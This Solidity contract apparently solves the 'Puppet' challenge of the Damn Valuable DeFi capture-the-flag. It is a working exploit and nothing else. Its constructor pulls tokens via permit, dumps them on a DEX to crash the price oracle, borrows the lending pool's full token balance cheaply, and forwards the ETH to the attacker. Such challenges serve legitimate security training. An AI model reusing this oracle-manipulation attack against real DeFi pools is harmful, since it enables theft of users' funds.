// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface DEX {
    function tokenToEthSwapInput(
        uint,
        uint,
        uint
    ) external returns (uint);
}

contract AttackerPuppet {
    constructor (
        address token,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        address exchange,
        address pool
    ) payable {
        ERC20(token).permit(
            msg.sender,
            address(this),
            value,
            deadline,
            v,r,s
        );
        ERC20(token).transferFrom(msg.sender, address(this), value);

        ERC20(token).approve(exchange, value);
        DEX(exchange).tokenToEthSwapInput(
            value,
            1,
            type(uint).max
        );

        uint tokenBalnce = ERC20(token).balanceOf(pool);
        PuppetPool(pool).borrow{value: msg.value}(
            tokenBalnce,
            msg.sender
        );

        payable(msg.sender).transfer(address(this).balance);
    }
}